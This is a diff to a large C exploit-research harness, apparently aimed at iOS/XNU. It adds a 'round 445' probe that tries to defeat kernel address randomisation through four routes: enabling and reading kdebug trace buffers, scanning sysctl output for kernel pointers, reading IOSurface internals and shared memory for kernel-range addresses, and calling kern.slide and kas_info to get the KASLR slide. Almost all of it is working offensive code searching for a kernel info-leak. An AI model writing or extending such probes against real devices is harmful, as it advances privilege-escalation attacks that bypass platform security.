@@ -16950,6 +16950,310 @@ static void *r440b_read_thread(void *arg) {
     return NULL;
 }
 
+static void r442_probe(void) {
+    rlog("\n=== r442: kdebug trace + broad kernel scan + stackshot + diagnostics ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: kdebug kernel tracing — try to read trace buffer */
+    rlog("  --- Vector A: kdebug kernel tracing ---\n");
+    {
+        /* KERN_KDEBUG = 14 on most XNU versions */
+        /* Sub-commands: KERN_KDENABLE=12, KERN_KDSETBUF=1, KERN_KDSETUP=3,
+           KERN_KDREADTR=5, KERN_KDGETBUF=2, KERN_KDBUFWAIT=7 */
+
+        /* First try to get current buffer info */
+        {
+            int mib[] = {1 /* CTL_KERN */, 14 /* KERN_KDEBUG */, 2 /* KERN_KDGETBUF */};
+            /* kbufinfo_t is {int nkdbufs; int nolog; unsigned int flags; int nkdthreads; int bufid;} */
+            struct { int nkdbufs; int nolog; unsigned int flags; int nkdthreads; int bufid; } bufinfo;
+            size_t sz = sizeof(bufinfo);
+            int ret = sysctl(mib, 3, &bufinfo, &sz, NULL, 0);
+            rlog("    KERN_KDGETBUF: ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);
+            if (ret == 0) {
+                rlog("      nkdbufs=%d nolog=%d flags=0x%x nkdthreads=%d bufid=%d\n",
+                     bufinfo.nkdbufs, bufinfo.nolog, bufinfo.flags, bufinfo.nkdthreads, bufinfo.bufid);
+            }
+        }
+
+        /* Try to enable tracing */
+        {
+            int val = 1;
+            int mib[] = {1, 14, 12 /* KERN_KDENABLE */};
+            int ret = sysctl(mib, 3, NULL, NULL, &val, sizeof(val));
+            rlog("    KERN_KDENABLE(1): ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);
+        }
+
+        /* Try to set up trace buffer */
+        {
+            int val = 1024;
+            int mib[] = {1, 14, 1 /* KERN_KDSETBUF */};
+            int ret = sysctl(mib, 3, NULL, NULL, &val, sizeof(val));
+            rlog("    KERN_KDSETBUF(1024): ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);
+        }
+
+        /* Try KERN_KDSETUP */
+        {
+            int mib[] = {1, 14, 3 /* KERN_KDSETUP */};
+            int ret = sysctl(mib, 3, NULL, NULL, NULL, 0);
+            rlog("    KERN_KDSETUP: ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);
+        }
+
+        /* Try to read trace buffer even if setup failed */
+        {
+            /* kd_buf: {uint64_t timestamp; uintptr_t arg1-4; uint32_t debugid; cpuid} */
+            /* On arm64, kd_buf is 64 bytes */
+            size_t bufsz = 64 * 1024;
+            uint8_t *trbuf = malloc(bufsz);
+            if (trbuf) {
+                memset(trbuf, 0, bufsz);
+                int mib[] = {1, 14, 5 /* KERN_KDREADTR */};
+                size_t needed = bufsz;
+                int ret = sysctl(mib, 3, trbuf, &needed, NULL, 0);
+                rlog("    KERN_KDREADTR: ret=%d errno=%d needed=%zu\n", ret, ret < 0 ? errno : 0, needed);
+
+                if (ret == 0 && needed > 0) {
+                    int nrecs = (int)(needed / 64);
+                    rlog("    Got %d trace records!\n", nrecs);
+                    /* Scan for kernel pointers */
+                    uint64_t *qw = (uint64_t*)trbuf;
+                    int kptrs = 0;
+                    for (size_t i = 0; i < needed / 8; i++) {
+                        if (qw[i] & 0x8000000000000000ULL) {
+                            /* High bit set — could be kernel address */
+                            if (qw[i] != 0xFFFFFFFFFFFFFFFFULL && qw[i] != 0x8000000000000000ULL) {
+                                if (kptrs < 20) {
+                                    rlog("      trace byte %zu: 0x%016llx\n", i*8, (unsigned long long)qw[i]);
+                                }
+                                kptrs++;
+                            }
+                        }
+                    }
+                    rlog("    Kernel-range values in trace: %d\n", kptrs);
+                }
+                free(trbuf);
+            }
+        }
+
+        /* Try kdebug_trace syscall directly (syscall 180) */
+        {
+            typedef int (*kdebug_trace_fn)(uint32_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+            kdebug_trace_fn kdt = (kdebug_trace_fn)dlsym(RTLD_DEFAULT, "kdebug_trace");
+            rlog("    kdebug_trace symbol: %p\n", kdt);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: sysctl brute-force — scan for large returns with kernel pointers */
+    rlog("\n  --- Vector B: sysctl scan for kernel data ---\n");
+    {
+        /* Interesting kern sysctls: kern.proc, kern.boottime, kern.osversion, etc. */
+        /* Try CTL_KERN (1) with various second-level names */
+        int interesting_kptrs = 0;
+
+        /* KERN_PROC_ALL = {1, 14, 0, 0} but that's KDEBUG. KERN_PROC is {1, 14} on some... no.
+           Actually KERN_PROC = 14 on BSD, but on XNU KERN_KDEBUG = 14.
+           KERN_PROC on XNU = 14? No, different numbering.
+           Let's try sysctl by name instead. */
+
+        /* Try some known sysctls that might have kernel data */
+        struct { const char *name; } ctl_names[] = {
+            {"kern.boottime"},
+            {"kern.osrelease"},
+            {"kern.version"},
+            {"kern.maxproc"},
+            {"kern.maxfiles"},
+            {"kern.maxvnodes"},
+            {"kern.hostname"},
+            {"kern.uuid"},
+            {"hw.machine"},
+            {"hw.memsize"},
+            {"hw.physicalcpu"},
+            {"hw.cacheconfig"},
+            {"hw.cachesize"},
+            {"hw.cachelinesize"},
+            {"hw.l1dcachesize"},
+            {"hw.l1icachesize"},
+            {"hw.l2cachesize"},
+            {"hw.l3cachesize"},
+            {"hw.tbfrequency"},
+            {"machdep.cpu.brand_string"},
+            {"kern.memorystatus_level"},
+            {"vm.swapusage"},
+            {"vm.loadavg"},
+            {"kern.securelevel"},
+            {"kern.usrstack64"},
+            {"kern.slide"},
+        };
+        int nctls = sizeof(ctl_names)/sizeof(ctl_names[0]);
+
+        for (int i = 0; i < nctls; i++) {
+            uint8_t buf[4096];
+            size_t sz = sizeof(buf);
+            memset(buf, 0, sizeof(buf));
+            int ret = sysctlbyname(ctl_names[i].name, buf, &sz, NULL, 0);
+            if (ret == 0 && sz > 0) {
+                /* Check for kernel pointers */
+                uint64_t *qw = (uint64_t*)buf;
+                int kptrs = 0;
+                for (size_t j = 0; j < sz / 8; j++) {
+                    if ((qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("    '%s' +%zu: 0x%016llx ← KPTR!\n",
+                             ctl_names[i].name, j*8, (unsigned long long)qw[j]);
+                        kptrs++;
+                        interesting_kptrs++;
+                    }
+                }
+                /* Show value for interesting ones */
+                if (sz == 8) {
+                    rlog("    '%s': 0x%016llx (%llu)\n", ctl_names[i].name,
+                         (unsigned long long)qw[0], (unsigned long long)qw[0]);
+                } else if (sz <= 64 && kptrs == 0) {
+                    /* Show as string if printable */
+                    int printable = 1;
+                    for (size_t j = 0; j < sz - 1 && j < 60; j++) {
+                        if (buf[j] != 0 && (buf[j] < 32 || buf[j] > 126)) { printable = 0; break; }
+                    }
+                    if (printable && sz > 1 && buf[0] >= 32) {
+                        rlog("    '%s': \"%s\" (%zu bytes)\n", ctl_names[i].name, buf, sz);
+                    }
+                }
+            } else if (ret < 0) {
+                if (strcmp(ctl_names[i].name, "kern.slide") == 0 ||
+                    strcmp(ctl_names[i].name, "kern.usrstack64") == 0) {
+                    rlog("    '%s': ret=%d errno=%d (%s)\n",
+                         ctl_names[i].name, ret, errno, strerror(errno));
+                }
+            }
+        }
+        rlog("    Total kernel pointers in sysctl: %d\n", interesting_kptrs);
+    }
+    fflush(stdout);
+
+    /* Vector C: Broad address range scan of IOSurface shared data */
+    rlog("\n  --- Vector C: Broad kernel addr scan (bit63 + 0xFFFFFE range) ---\n");
+    {
+        /* Create 10 surfaces and scan ALL shared data for any high-range addresses */
+        int nsurf = 10;
+        IOSurfaceRef surfs[10];
+        for (int i = 0; i < nsurf; i++) {
+            int cw = 64, ch = 64, cbr = 256, ca = 16384, cpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef cn[5];
+            cn[0] = CFNumberCreate(NULL, kCFNumberIntType, &cw);
+            cn[1] = CFNumberCreate(NULL, kCFNumberIntType, &ch);
+            cn[2] = CFNumberCreate(NULL, kCFNumberIntType, &cbr);
+            cn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ca);
+            cn[4] = CFNumberCreate(NULL, kCFNumberIntType, &cpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), cn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), cn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), cn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), cn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), cn[4]);
+            surfs[i] = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int j = 0; j < 5; j++) CFRelease(cn[j]);
+        }
+
+        int high_addrs = 0;
+        for (int i = 0; i < nsurf; i++) {
+            if (!surfs[i]) continue;
+            uint64_t *shrp = (uint64_t*)*(void**)((char*)surfs[i] + 8);
+            if (!shrp) continue;
+
+            /* Scan 512 bytes of shared data */
+            for (int j = 0; j < 64; j++) {
+                uint64_t v = shrp[j];
+                if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL) continue;
+
+                /* Check for TTBR1 range (bit 63 set) */
+                if (v & 0x8000000000000000ULL) {
+                    rlog("    surf[%d] +%d: 0x%016llx (bit63 set)\n", i, j*8, (unsigned long long)v);
+                    high_addrs++;
+                }
+                /* Check for 0xFFFFFE range (sometimes used for kernel on newer chips) */
+                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL) {
+                    rlog("    surf[%d] +%d: 0x%016llx (0xFFFFFE range)\n", i, j*8, (unsigned long long)v);
+                    high_addrs++;
+                }
+            }
+        }
+        rlog("    High-range addresses in shared data: %d\n", high_addrs);
+
+        /* Also scan the IOSurfaceRef structure itself (448 bytes) */
+        rlog("    Scanning IOSurfaceRef structures:\n");
+        for (int i = 0; i < nsurf; i++) {
+            if (!surfs[i]) continue;
+            uint64_t *ref = (uint64_t*)surfs[i];
+            for (int j = 0; j < 56; j++) { /* 448/8 = 56 */
+                uint64_t v = ref[j];
+                if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL) continue;
+                if (v & 0x8000000000000000ULL) {
+                    rlog("    ref[%d] +%d: 0x%016llx (bit63 set)\n", i, j*8, (unsigned long long)v);
+                    high_addrs++;
+                }
+            }
+        }
+        rlog("    Total high-range addresses: %d\n", high_addrs);
+
+        for (int i = 0; i < nsurf; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: kern.slide sysctl and stack_snapshot exploration */
+    rlog("\n  --- Vector D: Kernel ASLR slide and stack snapshot ---\n");
+    {
+        /* kern.slide — directly exposes KASLR slide on older iOS! */
+        uint64_t slide = 0;
+        size_t ssz = sizeof(slide);
+        int ret = sysctlbyname("kern.slide", &slide, &ssz, NULL, 0);
+        rlog("    kern.slide: ret=%d errno=%d", ret, ret < 0 ? errno : 0);
+        if (ret == 0) {
+            rlog(" value=0x%016llx", (unsigned long long)slide);
+            if (slide != 0) rlog(" *** KASLR SLIDE! ***");
+        }
+        rlog("\n");
+
+        /* Try stack_snapshot_with_config if available */
+        typedef int (*stackshot_fn)(int, void*, uint32_t);
+        stackshot_fn ss = (stackshot_fn)dlsym(RTLD_DEFAULT, "stack_snapshot_with_config");
+        rlog("    stack_snapshot_with_config: %p\n", ss);
+
+        /* Try microstackshot */
+        typedef int (*micross_fn)(void*, uint32_t, uint32_t);
+        micross_fn mss = (micross_fn)dlsym(RTLD_DEFAULT, "microstackshot");
+        rlog("    microstackshot: %p\n", mss);
+
+        /* Try kevent_id — newer kevent interface */
+        /* Try process_policy */
+        typedef int (*procpol_fn)(int, int, int, int, void*, pid_t);
+        procpol_fn pp = (procpol_fn)dlsym(RTLD_DEFAULT, "process_policy");
+        rlog("    process_policy: %p\n", pp);
+
+        /* Try kas_info — kernel address space info (syscall 439) */
+        typedef int (*kasinfo_fn)(int, void*, size_t*);
+        kasinfo_fn kasi = (kasinfo_fn)dlsym(RTLD_DEFAULT, "kas_info");
+        rlog("    kas_info: %p\n", kasi);
+        if (kasi) {
+            uint64_t info[16];
+            size_t isz = sizeof(info);
+            memset(info, 0, sizeof(info));
+            ret = kasi(0 /* KAS_INFO_KERNEL_TEXT_SLIDE_SELECTOR */, info, &isz);
+            rlog("    kas_info(0): ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);
+            if (ret == 0) {
+                rlog("      slide=0x%016llx *** KASLR SLIDE VIA KAS_INFO! ***\n",
+                     (unsigned long long)info[0]);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r442 complete ===\n");
+    fflush(stdout);
+}
+
 static void r441_probe(void) {
     rlog("\n=== r441: proc_info + IOKit Registry + sysctl scan + kqueue ===\n\n");
     fflush(stdout);
@@ -77918,6 +78222,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 445) {
+            rlog("*** rounds=445: kdebug + sysctl scan + broad addr + kas_info ***\n\n");
+            fflush(stdout);
+            r442_probe();
+            goto done;
+        }
         if (rounds == 444) {
             rlog("*** rounds=444: proc_info + IOKit Registry + csops + kqueue ***\n\n");
             fflush(stdout);
@@ -80608,7 +80918,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
